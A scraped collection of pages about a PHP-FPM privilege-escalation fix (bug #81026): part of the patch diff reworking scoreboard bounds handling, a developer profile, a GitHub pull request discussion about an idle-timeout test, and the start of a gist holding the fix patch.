child_index, scoreboard->nprocs); +} +/* }}} */   -	return scoreboard->procs[child_index]; +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child) /* {{{*/ +{ +	struct fpm_worker_pool_s *wp = child->wp; +	unsigned int nprocs = wp->config->pm_max_children; +	struct fpm_scoreboard_s *scoreboard = wp->scoreboard; +	int child_index = child->scoreboard_i; + +	return fpm_scoreboard_proc_get_ex(scoreboard, child_index, nprocs);  }  /* }}} */   +  struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang) /* {{{ */  {  	struct fpm_scoreboard_s *s; @@ -234,28 +247,28 @@ void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc) /* {{{ */  	proc->lock = 0;  }   -void fpm_scoreboard_free(struct fpm_scoreboard_s *scoreboard) /* {{{ */ +void fpm_scoreboard_free(struct fpm_worker_pool_s *wp) /* {{{ */  { -	size_t scoreboard_size, scoreboard_nprocs_size; +	size_t scoreboard_procs_size; +	struct fpm_scoreboard_s *scoreboard = wp->scoreboard;    	if (!scoreboard) {  		zlog(ZLOG_ERROR, "**scoreboard is NULL");  		return;  	}   -	scoreboard_size        = sizeof(struct fpm_scoreboard_s) + (scoreboard->nprocs) * sizeof(struct fpm_scoreboard_proc_s *); -	scoreboard_nprocs_size = sizeof(struct fpm_scoreboard_proc_s) * scoreboard->nprocs; +	scoreboard_procs_size = sizeof(struct fpm_scoreboard_proc_s) * wp->config->pm_max_children;   -	fpm_shm_free(scoreboard, scoreboard_size + scoreboard_nprocs_size); +	fpm_shm_free(scoreboard, sizeof(struct fpm_scoreboard_s) + scoreboard_procs_size);  }  /* }}} */   -void fpm_scoreboard_child_use(struct fpm_scoreboard_s *scoreboard, int child_index, pid_t pid) /* {{{ */ +void fpm_scoreboard_child_use(struct fpm_child_s *child, pid_t pid) /* {{{ */  {  	struct fpm_scoreboard_proc_s *proc; -	fpm_scoreboard = scoreboard; -	fpm_scoreboard_i = child_index; -	proc = fpm_scoreboard_proc_get(scoreboard, child_index); +	fpm_scoreboard = child->wp->scoreboard; +	fpm_scoreboard_i = child->scoreboard_i; +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return;  	} @@ -264,18 +277,22 @@ void fpm_scoreboard_child_use(struct fpm_scoreboard_s *scoreboard, int child_ind  }  /* }}} */   -void fpm_scoreboard_proc_free(struct fpm_scoreboard_s *scoreboard, int child_index) /* {{{ */ +void fpm_scoreboard_proc_free(struct fpm_child_s *child) /* {{{ */  { +	struct fpm_worker_pool_s *wp = child->wp; +	struct fpm_scoreboard_s *scoreboard = wp->scoreboard; +	int child_index = child->scoreboard_i; +  	if (!scoreboard) {  		return;  	}   -	if (child_index < 0 || (unsigned int)child_index >= scoreboard->nprocs) { +	if (child_index < 0 || child_index >= wp->config->pm_max_children) {  		return;  	}   -	if (scoreboard->procs[child_index] && scoreboard->procs[child_index]->used > 0) { -		memset(scoreboard->procs[child_index], 0, sizeof(struct fpm_scoreboard_proc_s)); +	if (scoreboard->procs[child_index].used > 0) { +		memset(&scoreboard->procs[child_index], 0, sizeof(struct fpm_scoreboard_proc_s));  	}    	/* set this slot as free to avoid search on next alloc */ @@ -283,41 +300,44 @@ void fpm_scoreboard_proc_free(struct fpm_scoreboard_s *scoreboard, int child_ind  }  /* }}} */   -int fpm_scoreboard_proc_alloc(struct fpm_scoreboard_s *scoreboard, int *child_index) /* {{{ */ +int fpm_scoreboard_proc_alloc(struct fpm_child_s *child) /* {{{ */  {  	int i = -1; +	struct fpm_worker_pool_s *wp = child->wp; +	struct fpm_scoreboard_s *scoreboard = wp->scoreboard; +	int nprocs = wp->config->pm_max_children;   -	if (!scoreboard || !child_index) { +	if (!scoreboard) {  		return -1;  	}    	/* first try the slot which is supposed to be free */ -	if (scoreboard->free_proc >= 0 && (unsigned int)scoreboard->free_proc < scoreboard->nprocs) { -		if (scoreboard->procs[scoreboard->free_proc] && !scoreboard->procs[scoreboard->free_proc]->used) { +	if (scoreboard->free_proc >= 0 && scoreboard->free_proc < nprocs) { +		if (!scoreboard->procs[scoreboard->free_proc].used) {  			i = scoreboard->free_proc;  		}  	}    	if (i < 0) { /* the supposed free slot is not, let's search for a free slot */  		zlog(ZLOG_DEBUG, "[pool %s] the proc->free_slot was not free. Let's search", scoreboard->pool); -		for (i = 0; i < (int)scoreboard->nprocs; i++) { -			if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /* found */ +		for (i = 0; i < nprocs; i++) { +			if (!scoreboard->procs[i].used) { /* found */  				break;  			}  		}  	}    	/* no free slot */ -	if (i < 0 || i >= (int)scoreboard->nprocs) { +	if (i < 0 || i >= nprocs) {  		zlog(ZLOG_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool);  		return -1;  	}   -	scoreboard->procs[i]->used = 1; -	*child_index = i; +	scoreboard->procs[i].used = 1; +	child->scoreboard_i = i;    	/* supposed next slot is free */ -	if (i + 1 >= (int)scoreboard->nprocs) { +	if (i + 1 >= nprocs) {  		scoreboard->free_proc = 0;  	} else {  		scoreboard->free_proc = i + 1; diff --git a/sapi/fpm/fpm/fpm_scoreboard.h b/sapi/fpm/fpm/fpm_scoreboard.h index 1fecde1d0f..9d5981e1c7 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.h +++ b/sapi/fpm/fpm/fpm_scoreboard.h @@ -63,7 +63,7 @@ struct fpm_scoreboard_s {  	unsigned int nprocs;  	int free_proc;  	unsigned long int slow_rq; -	struct fpm_scoreboard_proc_s *procs[]; +	struct fpm_scoreboard_proc_s procs[];  };    int fpm_scoreboard_init_main(); @@ -72,18 +72,19 @@ int fpm_scoreboard_init_child(struct fpm_worker_pool_s *wp);  void fpm_scoreboard_update(int idle, int active, int lq, int lq_len, int requests, int max_children_reached, int slow_rq, int action, struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_s *fpm_scoreboard_get();  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *scoreboard, int child_index); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child);    struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang);  void fpm_scoreboard_release(struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_s *scoreboard, int child_index, int nohang);  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc);   -void fpm_scoreboard_free(struct fpm_scoreboard_s *scoreboard); +void fpm_scoreboard_free(struct fpm_worker_pool_s *wp);   -void fpm_scoreboard_child_use(struct fpm_scoreboard_s *scoreboard, int child_index, pid_t pid); +void fpm_scoreboard_child_use(struct fpm_child_s *child, pid_t pid);   -void fpm_scoreboard_proc_free(struct fpm_scoreboard_s *scoreboard, int child_index); -int fpm_scoreboard_proc_alloc(struct fpm_scoreboard_s *scoreboard, int *child_index); +void fpm_scoreboard_proc_free(struct fpm_child_s *child); +int fpm_scoreboard_proc_alloc(struct fpm_child_s *child);    #ifdef HAVE_TIMES  float fpm_scoreboard_get_tick(); diff --git a/sapi/fpm/fpm/fpm_status.c b/sapi/fpm/fpm/fpm_status.c index 36d2240635..de8db9d61a 100644 --- a/sapi/fpm/fpm/fpm_status.c +++ b/sapi/fpm/fpm/fpm_status.c @@ -498,10 +498,10 @@ int fpm_status_handle_request(void) /* {{{ */    			first = 1;  			for (i=0; i<scoreboard_p->nprocs; i++) { -				if (!scoreboard_p->procs[i] || !scoreboard_p->procs[i]->used) { +				if (!scoreboard_p->procs[i].used) {  					continue;  				} -				proc = *scoreboard_p->procs[i]; +				proc = scoreboard_p->procs[i];    				if (first) {  					first = 0; diff --git a/sapi/fpm/fpm/fpm_worker_pool.c b/sapi/fpm/fpm/fpm_worker_pool.c index d04528f4e0..65a9b226b1 100644 --- a/sapi/fpm/fpm/fpm_worker_pool.c +++ b/sapi/fpm/fpm/fpm_worker_pool.c @@ -54,7 +54,7 @@ static void fpm_worker_pool_cleanup(int which, void *arg) /* {{{ */  		fpm_worker_pool_config_free(wp->config);  		fpm_children_free(wp->children);  		if ((which & FPM_CLEANUP_CHILD) == 0 && fpm_globals.parent_pid == getpid()) { -			fpm_scoreboard_free(wp->scoreboard); +			fpm_scoreboard_free(wp);  		}  		fpm_worker_pool_free(wp);  	} --  2.25.1   ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 11:01:31 2025 UTC |



=== Content from people.php.net_aecf5fb1_20250115_115343.html ===


[![php](//php.net/images/logo.php?people)people](/)

* [Manage](https://main.php.net/manage/users.php)
* [Help](https://wiki.php.net/web/people)

# Jakub Zelenka

## bukka

![Picture of Jakub Zelenka](//www.gravatar.com/avatar/f5c5576d3cbd7a1250182a303ef67b5e.jpg?s=460)

* bukka@php.net
* [0 open bugs assigned](https://bugs.php.net/search.php?cmd=display&order_by=ts2&direction=DESC&status=Open&assign=bukka)
* [edit on main](https://main.php.net/manage/users.php?username=bukka)

﻿

* [Copyright © 2001-2025 The PHP Group](//php.net/copyright)
* [Other PHP.net sites](//php.net/sites)
* [Privacy policy](//php.net/privacy)



=== Content from github.com_b425c1a7_20250115_115339.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F7464)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F7464)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  563](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fphp%2Fphp-src%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fphp%2Fphp-src%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Add FPM prod idle timeout test #7464

 Closed

[bukka](/bukka)
wants to merge
1
commit into
[php:PHP-7.4](/php/php-src/tree/PHP-7.4 "php/php-src:PHP-7.4")
from
[bukka:fpm\_proc\_idle\_timeout\_test](/bukka/php-src/tree/fpm_proc_idle_timeout_test "bukka/php-src:fpm_proc_idle_timeout_test")

 Closed

# [Add FPM prod idle timeout test](#top) #7464

[bukka](/bukka)
wants to merge
1
commit into
[php:PHP-7.4](/php/php-src/tree/PHP-7.4 "php/php-src:PHP-7.4")
from
[bukka:fpm\_proc\_idle\_timeout\_test](/bukka/php-src/tree/fpm_proc_idle_timeout_test "bukka/php-src:fpm_proc_idle_timeout_test")

[Conversation
13](/php/php-src/pull/7464)
[Commits
1](/php/php-src/pull/7464/commits)
[Checks
0](/php/php-src/pull/7464/checks)
[Files changed](/php/php-src/pull/7464/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![bukka](https://avatars.githubusercontent.com/u/137594?s=60&v=4)](/bukka)

Copy link

Member

### @bukka **[bukka](/bukka)** commented [Sep 5, 2021](#issue-988569548)

This tests FPM `pm.process_idle_timeout` functionality. To be able to do that multi request (using multiple clients) support has been added to FPM tester. This will be helpful for some other cases as well.

Sorry, something went wrong.

All reactions

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Sep 6, 2021](#issuecomment-913470297)

| Fails on azure with:  Warning: preg\_match(): Unknown modifier 'd' in /home/vsts/work/1/s/sapi/fpm/tests/status.inc on line 246 |
| --- |

All reactions

Sorry, something went wrong.

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Sep 6, 2021](#issuecomment-913471360)

| That's because checkStatusOpenmetrics contains `#` and you're now using it as the delimiter. You can use `(` and `)` for minimal intrusiveness. |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&v=4)](/bukka)

`[Add FPM prod idle timeout test](/php/php-src/pull/7464/commits/f5d19e59ed298e0ba34cf1e08599e14428183408 "Add FPM prod idle timeout test")`

`[f5d19e5](/php/php-src/pull/7464/commits/f5d19e59ed298e0ba34cf1e08599e14428183408)`

 [![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)
[bukka](/bukka)
[force-pushed](/php/php-src/compare/cc1ed711577eea6e20e9585c32491614b7f01594..f5d19e59ed298e0ba34cf1e08599e14428183408)
the
fpm\_proc\_idle\_timeout\_test

branch
from
[`cc1ed71`](/php/php-src/commit/cc1ed711577eea6e20e9585c32491614b7f01594) to
[`f5d19e5`](/php/php-src/commit/f5d19e59ed298e0ba34cf1e08599e14428183408)  [Compare](/php/php-src/compare/cc1ed711577eea6e20e9585c32491614b7f01594..f5d19e59ed298e0ba34cf1e08599e14428183408)
[September 10, 2021 20:10](#event-5286354172)

 [![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)
[bukka](/bukka)
changed the base branch from
master

to
PHP-7.4

[September 12, 2021 18:20](#event-5289462696)

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=40&v=4)](/nikic)
[nikic](/nikic)
closed this
[Sep 20, 2021](#event-5327980390)

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=40&v=4)](/nikic)
[nikic](/nikic)
reopened this
[Sep 20, 2021](#event-5327980594)

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Sep 20, 2021](#issuecomment-922910259)

| Looks like it still fails with `Unknown modifier 'd'`. |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=80&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)

Copy link

Member

Author

### **[bukka](/bukka)** commented [Sep 26, 2021](#issuecomment-927359625)

| [@nikic](https://github.com/nikic) I just see fail on MACOS that is some configuration and then Travis is failing but no idea what it is about because it shows at the end:  ``` Number of tests : 17043             13584  Tests skipped   : 3459 ( 20.3%) --------  Tests warned    :    0 (  0.0%) (  0.0%)  Tests failed    :    0 (  0.0%) (  0.0%)  Expected fail   :   28 (  0.2%) (  0.2%)  Tests passed    : 13556 ( 79.5%) ( 99.8%)  --------------------------------------------------  ```  Also slow tests seem to be skipped there anyway.  The main test for php.php-src (DEBUG\_NTS) is however green so it seems fine to me. Could you point me where you still see that error? Or was it just that you were just looking to the old build? |
| --- |

All reactions

Sorry, something went wrong.

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Sep 26, 2021](#issuecomment-927360992)

| [@bukka](https://github.com/bukka) <https://app.travis-ci.com/github/php/php-src/jobs/536733394#L4146>  I think Travis is still running this against the master branch and not PHP-7.4, which is why only it fails. (Your original choice of master was correct, as this is not a regression test accompanying a bug fix it should not go into PHP-7.4.) |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=80&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)

Copy link

Member

Author

### **[bukka](/bukka)** commented [Sep 26, 2021](#issuecomment-927367790) • edited Loading

| Ah yeah I see it now. There are multiple of those results and I was looking to the last one only - too many lines in the result... :) It's still using master for Travis so will need to re-test it there and fix it as it will get merged too. I'm targeting 7.4 because it's a test that covers current logic for one future fix that I have got in the pipeline. It's just not part of the fix because it's a generic functionality test but want to have it available before the fix. |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=80&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)

Copy link

Member

Author

### **[bukka](/bukka)** commented [Oct 2, 2021](#issuecomment-932789907)

| This has been merged as [08f52b1](https://github.com/php/php-src/commit/08f52b1643d7a068e30c0abf5e1cad359f0eed06) . That master failure was specific to that openmetrics test which should be hopefully fixed by [4ef6280](https://github.com/php/php-src/commit/4ef6280b9aa907378eeac7d3fde0ddd479603957) in PHP 8.1+. |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)
[bukka](/bukka)
closed this
[Oct 2, 2021](#event-5398529316)

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Oct 2, 2021](#issuecomment-932820069)

| The test fails on macos: <https://dev.azure.com/phpazuredevops/PHP/_build/results?buildId=20552&view=ms.vss-test-web.build-test-results-tab&runId=473790&paneView=debug&resultId=115842> |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=80&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)

Copy link

Member

Author

### **[bukka](/bukka)** commented [Oct 3, 2021](#issuecomment-932884404) via email

| It might be that process idle doesn't work there properly. I don't have a way to test it on mac os and it's not that interesting platform for fpm anyway (meaning people should not be runnig fpm on mac os in prod) so best to just disable it there. What's the best way to skip mac os only? |
| --- |

All reactions

Sorry, something went wrong.

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Oct 3, 2021](#issuecomment-932886595)

| [@bukka](https://github.com/bukka) It also fails intermittently on other platforms, with the same problem (total processes 2 instead of 1). |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=80&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)

Copy link

Member

Author

### **[bukka](/bukka)** commented [Oct 4, 2021](#issuecomment-933851553)

| [@nikic](https://github.com/nikic) Ok trying with higher timeout. If it doesn't work, it can be skipped in the pipeline as it might not have enough resources or there might be other problems that I might check later. Please don't revert it but feel free to add a skip if it breaks things. This test is still important for me even if it doesn't work in the pipeline. |
| --- |

All reactions

Sorry, something went wrong.

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [Oct 4, 2021](#issuecomment-933877577)

| I had to disable the test again, because it's still failing: <https://dev.azure.com/phpazuredevops/PHP/_build/results?buildId=20597&view=ms.vss-test-web.build-test-results-tab&runId=475324&resultId=115501&paneView=debug> I think the problem is that the two requests may not actually result in the creation of a second process if they arrive sequentially.  Please avoid landing failing tests at end of the (European/UTC) day, because this breaks our nightly builds. I don't want them to be broken the third day in a row due to this test. It would be best to open a PR to make sure it works properly before re-enabling it. |
| --- |

All reactions

Sorry, something went wrong.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=80&u=af3f20f15f0ca413b8ccd78f7a6daa6f480c18d8&v=4)](/bukka)

Copy link

Member

Author

### **[bukka](/bukka)** commented [Oct 5, 2021](#issuecomment-934750286) • edited Loading

| Ah sorry, I didn't realise that it was breaking nightly builds.  I think I increased the wrong value actually looking at it again. Just trying this PR to see if it changes anything: [#7561](https://github.com/php/php-src/pull/7561) |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F7464)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=52&v=4)](/bukka) [![@nikic](https://avatars.githubusercontent.com/u/216080?s=52&v=4)](/nikic)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_b959ec8c_20250115_115352.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=64&v=4)](/bukka)

# [bukka](/bukka)/**[fmp\_scoreboard\_proc\_oob.patch](/bukka/72a0408e027b85e72d6f4e622974eb01)** Secret

Last active
May 31, 2021 21:34

Show Gist options

* [Download ZIP](/bukka/72a0408e027b85e72d6f4e622974eb01/archive/36e69eb1cb3d0e860bebf5c6903455791de4daea.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/bukka/72a0408e027b85e72d6f4e622974eb01.js&quot;&gt;&lt;/script&gt;
* Save bukka/72a0408e027b85e72d6f4e622974eb01 to your computer and use it in GitHub Desktop.

[Code](/bukka/72a0408e027b85e72d6f4e622974eb01)
[Revisions
3](/bukka/72a0408e027b85e72d6f4e622974eb01/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/bukka/72a0408e027b85e72d6f4e622974eb01.js&quot;&gt;&lt;/script&gt;

Save bukka/72a0408e027b85e72d6f4e622974eb01 to your computer and use it in GitHub Desktop.

[Download ZIP](/bukka/72a0408e027b85e72d6f4e622974eb01/archive/36e69eb1cb3d0e860bebf5c6903455791de4daea.zip)

PHP-FPM fix for bug #81026

 [Raw](/bukka/72a0408e027b85e72d6f4e622974eb01/raw/36e69eb1cb3d0e860bebf5c6903455791de4daea/fmp_scoreboard_proc_oob.patch)

[**fmp\_scoreboard\_proc\_oob.patch**](#file-fmp_scoreboard_proc_oob-patch)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From 19e7d62e2128a5d9d4f5fa8e376a2e177f24b350 Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: Jakub Zelenka <bukka@php.net> |
|  | Date: Mon, 31 May 2021 14:26:09 +0100 |
|  | Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to |
|  | privilege escalation) |
|  |  |
|  | --- |
|  | sapi/fpm/fpm/fpm\_request.c | 6 +++--- |
|  | sapi/fpm/fpm/fpm\_scoreboard.c | 36 +++++++++++++++++++++++++++++++++++ |
|  | sapi/fpm/fpm/fpm\_scoreboard.h | 2 ++ |
|  | 3 files changed, 41 insertions(+), 3 deletions(-) |
|  |  |
|  | diff --git a/sapi/fpm/fpm/fpm\_request.c b/sapi/fpm/fpm/fpm\_request.c |
|  | index 83401f1553..540949b026 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_request.c |
|  | +++ b/sapi/fpm/fpm/fpm\_request.c |
|  | @@ -227,7 +227,7 @@ void fpm\_request\_check\_timed\_out(struct fpm\_child\_s \*child, struct timeval \*now, |
|  | { |
|  | struct fpm\_scoreboard\_proc\_s proc, \*proc\_p; |
|  |  |
|  | - proc\_p = fpm\_scoreboard\_proc\_acquire(child->wp->scoreboard, child->scoreboard\_i, 1); |
